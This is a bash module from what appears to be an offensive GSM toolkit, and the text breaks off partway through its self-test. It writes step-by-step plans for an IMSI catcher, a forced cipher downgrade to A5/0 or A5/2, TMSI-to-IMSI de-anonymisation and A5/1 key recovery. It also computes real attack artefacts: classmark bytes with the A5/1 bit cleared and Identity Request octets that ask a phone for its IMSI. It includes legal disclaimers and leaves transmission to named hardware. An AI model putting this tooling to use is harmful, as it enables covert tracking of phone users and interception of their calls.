#!/usr/bin/env bash
# gsm attack — IMSI catcher logic, A5/1 downgrade, TMSI de-anonymisation, Kc recovery
#
# Honest split. The vectors that need a transmitter (an IMSI catcher's fake
# BCCH, a downgrade RAND/Cipher-Mode-Message pair, a forced Identity Request)
# are documented as PLAN FILES with `status: handoff` and the exact hardware
# named — this module does not pretend to fire them. The vectors that are pure
# computation (the RACH->AGCH->SDCCH sequence, classmark encoding, the paging
# response race timing, the Kc recovery arithmetic) are performed for real.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/gsm_attack"
GATK_DIR="$LOOT_DIR/gsm_attack"
mkdir -p "$MOD_TMP" "$GATK_DIR" 2>/dev/null

# Shared cross-module state — other modules read these.
GATK_SDR="${TMP_DIR}/sdr_device"
GATK_ARFCN="${TMP_DIR}/target_arfcn"
GATK_PLMN="${TMP_DIR}/target_plmn"

# ── sanitisation ────────────────────────────────────────────────────────
gatk_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── hex helpers (same contract as 10_gsm_air.sh) ────────────────────────
gatk_norm_hex() {
    printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'
}
gatk_is_hex() {
    local h; h=$(gatk_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
gatk_hex_to_bits() {
    local h; h=$(gatk_norm_hex "${1:-}")
    local i out=""
    for (( i = 0; i < ${#h}; i++ )); do
        case "${h:i:1}" in
            0) out+=0000 ;; 1) out+=0001 ;; 2) out+=0010 ;; 3) out+=0011 ;;
            4) out+=0100 ;; 5) out+=0101 ;; 6) out+=0110 ;; 7) out+=0111 ;;
            8) out+=1000 ;; 9) out+=1001 ;; a) out+=1010 ;; b) out+=1011 ;;
            c) out+=1100 ;; d) out+=1101 ;; e) out+=1110 ;; f) out+=1111 ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}
gatk_bits_to_hex() {
    local bits="${1:-}"
    while (( ${#bits} % 4 != 0 )); do bits+="0"; done
    local i nib out=""
    for (( i = 0; i < ${#bits}; i += 4 )); do
        nib="${bits:i:4}"
        case "$nib" in
            0000) out+="0" ;; 0001) out+="1" ;; 0010) out+="2" ;; 0011) out+="3" ;;
            0100) out+="4" ;; 0101) out+="5" ;; 0110) out+="6" ;; 0111) out+="7" ;;
            1000) out+="8" ;; 1001) out+="9" ;; 1010) out+="a" ;; 1011) out+="b" ;;
            1100) out+="c" ;; 1101) out+="d" ;; 1110) out+="e" ;; 1111) out+="f" ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}

# ── hardware guards ─────────────────────────────────────────────────────
# A transmitter is a different class of device from a receiver. An RTL-SDR
# cannot transmit at all, so it must never satisfy a transmit guard.
gatk_find_tx_sdr() {
    local d
    for d in hackrf bladerf usrp limesdr; do
        case "$d" in
            hackrf)  command -v hackrf_transfer  >/dev/null 2>&1 && { echo "hackrf";  return 0; } ;;
            bladerf) command -v bladeRF-cli      >/dev/null 2>&1 && { echo "bladerf"; return 0; } ;;
            usrp)    command -v uhd_siggen       >/dev/null 2>&1 && { echo "usrp"; return 0; } ;;
            limesdr) command -v LimeUtil         >/dev/null 2>&1 && { echo "limesdr"; return 0; } ;;
        esac
    done
    return 1
}

gatk_find_rx_sdr() {
    local d
    for d in hackrf bladerf limesdr usrp; do
        case "$d" in
            hackrf)  command -v hackrf_info     >/dev/null 2>&1 && { echo "hackrf";  return 0; } ;;
            bladerf) command -v bladeRF-cli     >/dev/null 2>&1 && { echo "bladerf"; return 0; } ;;
            limesdr) command -v LimeUtil        >/dev/null 2>&1 && { echo "limesdr"; return 0; } ;;
            usrp)    command -v uhd_find_devices >/dev/null 2>&1 && { echo "usrp"; return 0; } ;;
        esac
    done
    command -v rtl_test >/dev/null 2>&1 && { echo "rtlsdr"; return 0; }
    return 1
}

# gr-gsm provides the transmitter side (grgsm_livemon + the burst_sender
# flowgraphs); OsmocomBB needs a phone with the firmware loaded.
gatk_find_gsm_stack() {
    for t in grgsm_livemon grgsm_decode osmocon mobile; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

# The exact hardware each plan needs. Named, not implied.
gatk_required_hardware() {
    case "${1:-}" in
        imsi-catcher)
            echo "TX-capable SDR (HackRF One, BladeRF x40/x115, or USRP B200/B210) + gr-gsm (grgsm_livemon, burst_sender) or OsmocomBB on a Motorola C1xx/compal phone + a RX SDR to monitor the real BCCH" ;;
        a5-downgrade)
            echo "TX-capable SDR (HackRF/BladeRF/USRP) + gr-gsm burst_sender for the RAND/Authentication Request and Cipher Mode Command; a programmable SIM (sysmoUSIM/sysmocom or OsmocomBB) to observe the MS response" ;;
        tmsi-deanon)
            echo "TX-capable SDR (HackRF/BladeRF/USRP) + gr-gsm for the Identity Request on SDCCH; an RX SDR for the paging channel; optionally a USIM programmer to hold a known TMSI" ;;
        kc-recovery)
            echo "RX-capable SDR (RTL-SDR, HackRF, BladeRF, USRP) + gr-gsm or airprobe to capture the encrypted burst; 1.7 TB of A5/1 rainbow tables (or a GPU cluster) for the practical break" ;;
        *) echo "unknown plan" ;;
    esac
}

# ── plan files: status handoff, never a fake success ────────────────────
# A plan file is a TSV of KEY<TAB>VALUE lines with a status header. It is
# labelled a plan because the vector needs hardware this module cannot assume.
gatk_plan_path() { printf '%s/plan_%s.tsv' "$GATK_DIR" "${1:-}"; }

gatk_write_plan() {
    local name="${1:-}"
    case "$name" in
        imsi-catcher|a5-downgrade|tmsi-deanon|kc-recovery) ;;
        *) printf 'ERROR\tunknown plan: %s\n' "${name:-<none>}" >&2; return 2 ;;
    esac
    mkdir -p "$GATK_DIR" || {
        printf 'ERROR\tcannot create %s\n' "$GATK_DIR" >&2; return 1; }
    local f; f=$(gatk_plan_path "$name")
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    {
        printf 'status\thandoff\n'
        printf 'plan\t%s\n' "$name"
        printf 'written\t%s\n' "$ts"
        printf 'hardware\t%s\n' "$(gatk_required_hardware "$name")"
        printf 'tx_sdr_present\t%s\n' "$(gatk_find_tx_sdr || echo none)"
        printf 'rx_sdr_present\t%s\n' "$(gatk_find_rx_sdr || echo none)"
        printf 'gsm_stack_present\t%s\n' "$(gatk_find_gsm_stack || echo none)"
        gatk_plan_body "$name"
    } > "$f" || {
        printf 'ERROR\tcannot write plan file %s (permission denied?)\n' "$f" >&2
        return 1; }
    [[ -s "$f" ]] || {
        printf 'ERROR\tplan file %s is empty after write\n' "$f" >&2; return 1; }
    printf '%s\t%s\n' "$name" "$f"
    return 0
}

# The body of each plan: the real steps, in order, with the real parameters.
gatk_plan_body() {
    case "${1:-}" in
        imsi-catcher) cat <<'EOF'
objective	Capture the IMSI of every MS in the cell by impersonating a real base station
precondition	RX survey of the target cell completed (02_cell_recon.sh) so the ARFCN, BSIC, MCC/MNC, LAC and CI are known
step1	Park the RX SDR on the target ARFCN and record one full BCCH cycle: FCCH, SCH, BCCH with SI1/SI2/SI3/SI4/SI13. This yields the exact SI to clone.
step2	Build a fake BCCH on a free ARFCN with the same MCC/MNC/LAC/CI and a C1 value higher than the real cell. C1 = (A - max(B,0)) with A = RXLEV_ACCESS_MIN - RXLEV_AVG, B = MS_TXPWR_MAX_CCH - P. A higher C1 wins cell reselection (TS 45.008 section 6.4).
step3	Transmit the fake BCCH continuously. Neighbouring MSs reselect to it within one to three seconds (the reselection penalty timer).
step4	When an MS camps, page it (or wait for its Location Update) and answer the RACH with an Immediate Assignment on AGCH, granting an SDCCH.
step5	On the SDCCH, send IDENTITY REQUEST with identity type = IMSI BEFORE enabling ciphering. The MS replies IDENTITY RESPONSE carrying the IMSI in the clear.
step6	Optionally send a Cipher Mode Command with A5/0 and no authentication, then release the channel with a Location Update Reject so the MS returns to the real network without noticing.
timing_note	The whole exchange fits in one SDCCH transaction (about 0.5 to 1.5 s). A real network competing for the same MS will win if its C1 is higher, so the fake BCCH must be louder.
detection	The fake cell broadcasts no valid neighbour list, and an MS that logs cell history sees a new LAC/CI pair. A network-side audit sees no corresponding subscriber activity.
legal	Unauthorised transmission on licensed spectrum is illegal in every jurisdiction that has spectrum law. This is a plan for authorised research in a shielded enclosure or under an explicit licence.
EOF
            ;;
        a5-downgrade) cat <<'EOF'
objective	Force a target MS onto a weaker cipher (A5/0 or A5/2) so its traffic can be decrypted in real time
precondition	The MS is camped on the fake cell from the imsi-catcher plan, on a dedicated channel
step1	Observe the target MS classmark. A real network sends CLASSMARK ENQUIRY and the MS returns its Mobile Station Classmark 2, whose octet 1 bit 4 declares A5/1 support.
step2	Because the classmark is sent in the clear and is not integrity protected on GSM, it can be modified in flight. Clearing octet 1 bit 4 makes the MS advertise "no A5/1", after which the network is expected to fall back to A5/2 (TS 43.020 section 4.4).
step3	Send AUTHENTICATION REQUEST with a chosen RAND. Without the real Ki the SRES will not verify, so in practice the attacker sends a Cipher Mode Command with no preceding authentication. Many MSs accept it; those that do not reject with Cipher Mode Reject.
step4	Send CIPHER MODE COMMAND with the algorithm identifier in the Cipher Mode Setting IE: 000 for A5/0, 010 for A5/2. The MS begins ciphering with the requested algorithm.
step5	For A5/0 the keystream is all zeros: the traffic is plaintext. For A5/2 recover the key with the 16-bit-work factor attack (Briceno/Goldberg/Wagner, Crypto'99) and decrypt.
classmark_note	The downgrade rests entirely on the classmark being the only statement of cipher capability and being unauthenticated. This is the GSM design flaw, not an implementation bug.
detection	The MS logs Cipher Mode Reject if it refuses; a network that authenticated first will see no matching SRES.
legal	See the imsi-catcher plan: transmission on licensed spectrum requires authorisation.
EOF
            ;;
        tmsi-deanon) cat <<'EOF'
objective	Map a temporary identity (TMSI) observed on the air to the permanent IMSI behind it
precondition	A TMSI has been observed in a PAGING REQUEST on the target cell (or captured earlier)
step1	Record the TMSI from the PAGING REQUEST TYPE 1/2/3 on the PCH. The mobile identity IE type is 100 for a TMSI.
step2	Trigger a transaction that forces the network to ask the MS for its IMSI, or impersonate the network and send IDENTITY REQUEST with type = IMSI. The MS answers IDENTITY RESPONSE with the IMSI in the clear.
step3	Correlate the two: the Identity Response arrives on the SDCCH belonging to the same MS that was paged with that TMSI. The TMSI-to-IMSI mapping is now established.
step4	Optionally force a TMSI REALLOCATION COMMAND with a chosen TMSI so that the mapping is attacker-chosen and stable, making future correlation trivial.
paging_mapping	The paging block is selected by paging_group = IMSI mod 1024 (TS 45.002 section 6.5.2). Given the IMSI recovered in step 2, compute the group and confirm it matches the block the PAGING REQUEST was observed in. A match confirms the correlation without any further transmission.
detection	The de-anonymisation requires an Identity Request that the real network did not send, so the MS sees an unexpected procedure.
legal	See the imsi-catcher plan.
EOF
            ;;
        kc-recovery) cat <<'EOF'
objective	Recover the 64-bit cipher key Kc from an A5/1-protected burst whose plaintext is known or guessable
background	The key is loaded into three LFSRs of 19, 22 and 23 bits; the state space is 2^64, effectively 2^54 because COMP128 forces the low 10 bits of Kc to zero.
method_a_two_known_plaintext	Briceno/Goldberg/Wagner 1998 attack. Requires 2 frames, i.e. 2 * 228 = 456 known keystream bits, where 228 bits is one full frame (114 bits in each direction). Cost is roughly 2^51 operations in the original formulation.
method_b_rainbow_tables	Nohl 2009. Sort 1.7 TB of precomputed tables on the 64-bit state. Two known plaintext frames are enough; lookup is seconds on a modern machine. This is the reason A5/1 is dead in practice.
method_c_ciphertext_only	Barkan/Biham/Keller 2003. Exploits GSM error-correction redundancy so known plaintext is not strictly needed; needs roughly 2 seconds of recorded traffic.
step1	Capture the encrypted burst with gr-gsm or airprobe on the target ARFCN and timeslot. Confirm the frame is a TCH/F or SDCCH/8 burst with the training sequence matching the serving cell's TSC.
step2	Obtain known plaintext: an idle TCH/F frame is a specific bit pattern, and SACCH carries predictable System Information. 2 frames = 456 bits is the two-known-plaintext requirement.
step3	XOR the known plaintext with the ciphertext to recover the first keystream bits.
step4	Walk the rainbow tables (Kraken or a GPU implementation) keyed on the recovered keystream to obtain the 64-bit LFSR state.
step5	Clock the recovered state back to the start of the frame to obtain Kc, then decrypt every subsequent frame until the next re-key.
verification	Re-encrypt a later captured burst with the recovered Kc and check it matches byte for byte.
legal	Recording the radio spectrum and decrypting traffic you are not a party to is illegal in most jurisdictions.
EOF
            ;;
        *) return 1 ;;
    esac
}

gatk_cmd_plan() {
    local name="${1:-}"
    [[ -n "$name" ]] || {
        printf 'ERROR\tusage: --plan <imsi-catcher|a5-downgrade|tmsi-deanon|kc-recovery>\n' >&2
        return 2; }
    local out rc
    out=$(gatk_write_plan "$name"); rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tplan %s was not written (rc=%s)\n' "$name" "$rc" >&2
        return "$rc"
    fi
    printf 'plan\t%s\n' "$name"
    printf 'status\thandoff\n'
    printf 'file\t%s\n' "$(printf '%s' "$out" | cut -f2)"
    printf 'hardware\t%s\n' "$(gatk_required_hardware "$name")"
    return 0
}

gatk_cmd_plan_tsv() {
    local f
    for f in "$GATK_DIR"/plan_*.tsv; do
        [[ -f "$f" ]] || continue
        awk -F'\t' -v F="$f" '
            $1=="status"{s=$2} $1=="plan"{p=$2}
            END{printf "%s\t%s\t%s\n", p, s, F}' "$f"
    done
}

# ── IMSI catcher: the RACH -> AGCH -> SDCCH sequence (real construction) ─
# This is the channel sequence an IMSI catcher must drive. The message
# sequences are real TS 44.018 messages; we emit them as construction steps
# with the channel each rides on. Building the bit-level bursts for the radio
# is the handoff; deciding the sequence is not.
gatk_imsi_catcher_sequence() {
    cat <<'EOF'
step	channel	direction	message	message_type	purpose
1	BCCH	DL	SYSTEM INFORMATION TYPE 1	0x19	clone the cell allocation and RACH control parameters
2	BCCH	DL	SYSTEM INFORMATION TYPE 2	0x1a	clone the BCCH allocation (neighbour ARFCNs)
3	BCCH	DL	SYSTEM INFORMATION TYPE 3	0x1b	clone the identity: MCC, MNC, LAC, CI, T3212, control channel description
4	BCCH	DL	SYSTEM INFORMATION TYPE 4	0x1c	clone the LAC/CI and CBCH description
5	BCCH	DL	SYSTEM INFORMATION TYPE 13	0x04	clone the GPRS cell options so GPRS-capable MSs camp
6	RACH	UL	CHANNEL REQUEST	0x0c	the MS asks for a channel; 8 bits of random reference plus the establishment cause
7	AGCH	DL	IMMEDIATE ASSIGNMENT	0x3f	grant an SDCCH/8 sub-channel and a timing advance
8	SDCCH	DL	PAGING REQUEST TYPE 1	0x21	optional: page the target by TMSI to make it answer on the assigned channel
9	SDCCH	UL	PAGING RESPONSE	0x27	the MS identifies itself with its TMSI
10	SDCCH	UL	CM SERVICE REQUEST	0x24	alternative path: the MS requests a service and sends its identity
11	SDCCH	DL	IDENTITY REQUEST	0x05	ask for the IMSI explicitly, identity type = 001
12	SDCCH	UL	IDENTITY RESPONSE	0x06	the MS returns its IMSI in the clear - the objective
13	SDCCH	DL	CIPHER MODE COMMAND	0x35	optional: switch on A5/0 so the exchange is plaintext anyway
14	SDCCH	DL	CHANNEL RELEASE	0x0d	release so the MS returns to the real network
EOF
}

gatk_cmd_imsi_catcher_sequence() {
    gatk_imsi_catcher_sequence
}

# ── the paging-response race, in frames ─────────────────────────────────
# When both the real network and the fake cell page the same MS, the MS
# answers whoever it hears first with a valid paging block assignment. The
# race is decided in TDMA frames, so the attacker needs to be a few frames
# ahead. One 51-frame multiframe is 51 * 4.615 ms = 235.4 ms.
GATK_FRAME_MS="4.615"     # one TDMA frame, milliseconds
GATK_MF_FRAMES="51"       # frames per 51-multiframe (CCCH)

gatk_paging_race() {
    local lead="${1:-3}"
    [[ "$lead" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tlead must be a whole number of frames\n' >&2; return 2; }
    awk -v lead="$lead" -v fm="$GATK_FRAME_MS" -v mf="$GATK_MF_FRAMES" 'BEGIN{
        printf "tdma_frame_ms\t%.3f\n", fm
        printf "multiframe_frames\t%d\n", mf
        printf "multiframe_ms\t%.1f\n", fm * mf
        printf "attacker_lead_frames\t%d\n", lead
        printf "attacker_lead_ms\t%.2f\n", fm * lead
        printf "paging_block_period_ms\t%.1f\n", fm * mf
        # The MS answers the first valid assignment it decodes. A lead of one
        # frame is enough to win the decode race; three frames covers the
        # propagation and processing jitter of a typical handset.
        printf "race_window_frames\t%d\n", 1
        printf "verdict\t%s\n", (lead >= 1 ? "attacker can win the decode race if it is decoded first" : "attacker loses: the real network is decoded first")
    }'
}

# ── C1 reselection arithmetic (real) ────────────────────────────────────
# TS 45.008 section 6.4: C1 = (A - max(B, 0)) where
#   A = RXLEV_ACCESS_MIN - RXLEV_AVG          (both in dBm)
#   B = MS_TXPWR_MAX_CCH - P                  (both in dBm)
# A cell is selectable only if C1 > 0. A fake cell wins reselection if its
# C1 exceeds the serving cell's C1 for the 5-second reselection timer.
gatk_c1() {
    local rxlev_access_min="${1:-}" rxlev_avg="${2:-}" ms_txpwr_max="${3:-}" p="${4:-}"
    [[ "$rxlev_access_min" =~ ^-?[0-9]+$ && "$rxlev_avg" =~ ^-?[0-9]+$ &&
       "$ms_txpwr_max" =~ ^-?[0-9]+$ && "$p" =~ ^-?[0-9]+$ ]] || {
        printf 'ERROR\tC1 needs four dBm integers: RXLEV_ACCESS_MIN RXLEV_AVG MS_TXPWR_MAX_CCH P\n' >&2
        return 2; }
    awk -v ram="$rxlev_access_min" -v ra="$rxlev_avg" \
        -v mt="$ms_txpwr_max" -v p="$p" 'BEGIN{
        A = ram - ra
        B = mt - p
        b2 = (B > 0) ? B : 0
        C1 = A - b2
        printf "A_dbm\t%d\n", A
        printf "B_dbm\t%d\n", B
        printf "C1_dbm\t%d\n", C1
        printf "selectable\t%s\n", (C1 > 0 ? "yes" : "no")
    }'
}

# ── classmark encoder (real, byte-exact) ────────────────────────────────
# Mobile Station Classmark 2, TS 24.008 section 10.5.1.6. Five octets:
#   octet 1: bits 1-2 revision level, bit 3 ES-IND, bit 4 A5/1 support,
#            bits 5-7 RF power capability, bit 8 spare
#   octet 2: bit 1 spare, bit 2 SS screening indicator bit 1,
#            bit 3 SS screening indicator bit 2, bit 4 SM capability (no/yes),
#            bit 5 VBS, bit 6 VGCS, bit 7 VBS notification, bit 8 FC
#   octet 3: bit 1 CM3, bit 2 LCS, bit 3 PS capability, bit 4 spare,
#            bits 5-8 A5/2..A5/7 do NOT live here
#   octet 4: bits 1-6 A5/2, A5/3, A5/4, A5/5, A5/6, A5/7, bit 7 CMSP,
#            bit 8 spare (do not use unless checked)
#   octet 5: bit 1 SoLSA, bit 2 UCS2, bits 3-8 spare
# Bit numbering is 1-based from the LSB, which is the GSM convention.
gatk_classmark_encode() {
    local revision="${1:-3}" es_ind="${2:-0}" a51="${3:-1}" rfpow="${4:-3}"
    local ss_screen="${5:-1}" sm_cap="${6:-1}" vbs="${7:-0}" vgcs="${8:-0}"
    local vbs_notif="${9:-0}" fc="${10:-0}" cm3="${11:-0}" lcs="${12:-0}"
    local ps="${13:-1}" a52="${14:-0}" a53="${15:-0}" a54="${16:-0}"
    local a55="${17:-0}" a56="${18:-0}" a57="${19:-0}" cmsp="${20:-0}"
    local so_lsa="${21:-0}" ucs2="${22:-0}"

    local n
    for n in "$revision" "$es_ind" "$a51" "$rfpow" "$ss_screen" "$sm_cap" \
             "$vbs" "$vgcs" "$vbs_notif" "$fc" "$cm3" "$lcs" "$ps" \
             "$a52" "$a53" "$a54" "$a55" "$a56" "$a57" "$cmsp" \
             "$so_lsa" "$ucs2"; do
        [[ "$n" =~ ^[0-9]+$ ]] || {
            printf 'ERROR\tclassmark fields must be integers\n' >&2; return 2; }
    done
    (( revision <= 3 && rfpow <= 7 && ss_screen <= 3 )) || {
        printf 'ERROR\trevision<=3, rfpow<=7, ss_screen<=3\n' >&2; return 2; }

    # Build each octet from its 1-based bit positions. octet1 bit4 = A5/1,
    # which is bit index 3 in a 0-based LSB-first numbering.
    local o1 o2 o3 o4 o5
    o1=$(( (revision & 3) | ((es_ind & 1) << 2) | ((a51 & 1) << 3) | ((rfpow & 7) << 4) ))
    # octet 2 in TS order: bit2 = SS screening ind bit1, bit3 = bit2,
    # bit4 = SM capability, bit5 = VBS, bit6 = VGCS, bit7 = VBS notif, bit8 = FC
    o2=$(( ((ss_screen & 1) << 1) | (((ss_screen >> 1) & 1) << 2) | ((sm_cap & 1) << 3) | ((vbs & 1) << 4) | ((vgcs & 1) << 5) | ((vbs_notif & 1) << 6) | ((fc & 1) << 7) ))
    o3=$(( (cm3 & 1) | ((lcs & 1) << 1) | ((ps & 1) << 2) ))
    o4=$(( (a52 & 1) | ((a53 & 1) << 1) | ((a54 & 1) << 2) | ((a55 & 1) << 3) | ((a56 & 1) << 4) | ((a57 & 1) << 5) | ((cmsp & 1) << 6) ))
    o5=$(( (so_lsa & 1) | ((ucs2 & 1) << 1) ))
    printf '%02x%02x%02x%02x%02x' "$(( o1 & 0xff ))" "$(( o2 & 0xff ))" \
        "$(( o3 & 0xff ))" "$(( o4 & 0xff ))" "$(( o5 & 0xff ))"
}

# Decode a classmark back into its fields, so the encoder can be checked
# against itself and an observed classmark can be read.
gatk_classmark_decode() {
    local hex; hex=$(gatk_norm_hex "${1:-}")
    [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
        printf 'ERROR\tclassmark must be 5 octets of hex (10 digits)\n' >&2; return 2; }
    local o1=$(( 16#${hex:0:2} )) o2=$(( 16#${hex:2:2} )) o3=$(( 16#${hex:4:2} ))
    local o4=$(( 16#${hex:6:2} )) o5=$(( 16#${hex:8:2} ))
    printf 'revision\t%d\n'      "$(( o1 & 3 ))"
    printf 'es_ind\t%d\n'        "$(( (o1 >> 2) & 1 ))"
    printf 'a5_1\t%d\n'          "$(( (o1 >> 3) & 1 ))"
    printf 'rf_power\t%d\n'      "$(( (o1 >> 4) & 7 ))"
    printf 'ss_screen\t%d\n'     "$(( (o2 >> 1) & 3 ))"
    printf 'sm_cap\t%d\n'        "$(( (o2 >> 3) & 1 ))"
    printf 'vbs\t%d\n'           "$(( (o2 >> 4) & 1 ))"
    printf 'vgcs\t%d\n'          "$(( (o2 >> 5) & 1 ))"
    printf 'vbs_notif\t%d\n'     "$(( (o2 >> 6) & 1 ))"
    printf 'fc\t%d\n'            "$(( (o2 >> 7) & 1 ))"
    printf 'cm3\t%d\n'           "$(( o3 & 1 ))"
    printf 'lcs\t%d\n'           "$(( (o3 >> 1) & 1 ))"
    printf 'ps\t%d\n'            "$(( (o3 >> 2) & 1 ))"
    printf 'a5_2\t%d\n'          "$(( o4 & 1 ))"
    printf 'a5_3\t%d\n'          "$(( (o4 >> 1) & 1 ))"
    printf 'a5_4\t%d\n'          "$(( (o4 >> 2) & 1 ))"
    printf 'a5_5\t%d\n'          "$(( (o4 >> 3) & 1 ))"
    printf 'a5_6\t%d\n'          "$(( (o4 >> 4) & 1 ))"
    printf 'a5_7\t%d\n'          "$(( (o4 >> 5) & 1 ))"
    printf 'cmsp\t%d\n'          "$(( (o4 >> 6) & 1 ))"
    printf 'so_lsa\t%d\n'        "$(( o5 & 1 ))"
    printf 'ucs2\t%d\n'          "$(( (o5 >> 1) & 1 ))"
    return 0
}

gatk_cmd_classmark() {
    local hex="${1:-}"
    if [[ -z "$hex" ]]; then
        # No argument: emit the default encoder output.
        local cm; cm=$(gatk_classmark_encode) || return 1
        printf 'classmark\t%s\n' "$cm"
        gatk_classmark_decode "$cm"
        return 0
    fi
    gatk_classmark_decode "$hex"
}

# The downgrade edit: clear the A5/1 bit so the MS advertises no A5/1.
gatk_classmark_downgrade() {
    local hex; hex=$(gatk_norm_hex "${1:-}")
    [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
        printf 'ERROR\tclassmark must be 5 octets of hex (10 digits)\n' >&2; return 2; }
    local o1=$(( 16#${hex:0:2} ))
    local new_o1=$(( o1 & ~8 ))          # clear bit 4 (A5/1 support)
    printf 'before\t%s\n' "$hex"
    printf 'after\t%02x%s\n' "$new_o1" "${hex:2}"
    printf 'cleared_field\ta5_1\n'
}

# ── Identity Request construction (real bytes) ──────────────────────────
# IDENTITY REQUEST, TS 44.018 section 9.1.15 / 10.5.2.20. RR message:
#   octet 1: skip indicator (bits 5-8) | protocol discriminator (bits 1-4)
#            -> 0x05 for Radio Resources
#   octet 2: message type = 0x05 (IDENTITY REQUEST)
#   octet 3: identity type. In TS 44.018 the "Mobile Identity" IE here is a
#            4-bit "type of identity" followed by 4 spare bits:
#              001 IMSI, 010 IMEI, 011 IMEI+SVM, 100 TMSI
#            transmitted as the low nibble = type, high nibble = spare (0).
gatk_build_identity_request() {
    local type="${1:-1}"
    [[ "$type" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tidentity type must be an integer 1..4\n' >&2; return 2; }
    (( type >= 1 && type <= 4 )) || {
        printf 'ERROR\tidentity type %s out of range (1=IMSI 2=IMEI 3=IMEISV 4=TMSI)\n' "$type" >&2
        return 2; }
    # octet 3: low nibble carries the type, high nibble is spare.
    local o3=$(( type & 0x0f ))
    printf 'message\tIDENTITY_REQUEST\n'
    printf 'octets\t0505%02x\n' "$o3"
    printf 'identity_type\t%s\n' "$type"
    printf 'identity_name\t%s\n' "$(gatk_identity_name "$type")"
    printf 'purpose\t%s\n' "$([[ "$type" -eq 1 ]] && echo "force the MS to reveal its permanent IMSI in the clear" || echo "request a non-permanent identity")"
    return 0
}

gatk_identity_name() {
    case "${1:-}" in
        1) echo "IMSI" ;; 2) echo "IMEI" ;; 3) echo "IMEISV" ;; 4) echo "TMSI" ;;
        *) echo "unknown" ;;
    esac
}

# ── Kc recovery arithmetic (real) ───────────────────────────────────────
# GSM A5/1 keystream budget: one burst is 114 cipher bits; a full frame is
# 228 bits (114 in each direction). The two-known-plaintext attack needs
# 2 frames. COMP128 reduces the effective key from 64 to 54 bits because it
# sets the low 10 bits of Kc to zero.
gatk_kc_recovery_facts() {
    printf 'burst_cipher_bits\t114\n'
    printf 'frame_bits\t228\n'
    printf 'frames_required\t2\n'
    printf 'keystream_bits_required\t456\n'
    printf 'kc_bits\t64\n'
    printf 'kc_effective_bits\t54\n'
    printf 'comp128_zero_bits\t10\n'
    printf 'state_registers\t3\n'
    printf 'register_lengths\t19,22,23\n'
    printf 'state_space_bits\t64\n'
    printf 'useful_keystream_bits_per_frame\t228\n'
    return 0
}

gatk_cmd_kc_recovery() {
    gatk_kc_recovery_facts
    printf 'method\ttwo-known-plaintext (Briceno/Goldberg/Wagner 1998)\n'
    printf 'method_note\t2 frames = 456 known keystream bits; ~2^51 in the original formulation\n'
    printf 'method\trainbow-tables (Nohl 2009)\n'
    printf 'method_note\t1.7 TB of tables, seconds per key once the keystream is known\n'
    printf 'method\tciphertext-only (Barkan/Biham/Keller 2003)\n'
    printf 'method_note\texploits error-correction redundancy; ~2 s of recorded traffic\n'
    printf 'status\tcomputation-only; the capture itself needs an RX SDR\n'
    return 0
}

# ── CLI verbs ───────────────────────────────────────────────────────────
gatk_cli_status_tsv() {
    local tx rx stack
    tx=$(gatk_find_tx_sdr) || tx="none"
    rx=$(gatk_find_rx_sdr) || rx="none"
    stack=$(gatk_find_gsm_stack) || stack="none"
    printf 'tx_sdr\t%s\n'      "$tx"
    printf 'rx_sdr\t%s\n'      "$rx"
    printf 'gsm_stack\t%s\n'   "$stack"
    printf 'tx_capable\t%s\n'  "$([[ "$tx" != none ]] && echo yes || echo no)"
    printf 'dir\t%s\n'         "$GATK_DIR"
    printf 'plans\t%s\n'       "$(gatk_plan_count)"
    printf 'can_transmit\t%s\n' "$([[ "$tx" != none && "$stack" != none ]] && echo yes || echo no)"
    printf 'kc_frame_bits\t228\n'
    printf 'kc_bits_required\t456\n'
}

gatk_plan_count() {
    local n=0 f
    for f in "$GATK_DIR"/plan_*.tsv; do [[ -f "$f" ]] && n=$(( n + 1 )); done
    echo "$n"
}

# ── selftest — no radio, no root, no network ────────────────────────────
gatk_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
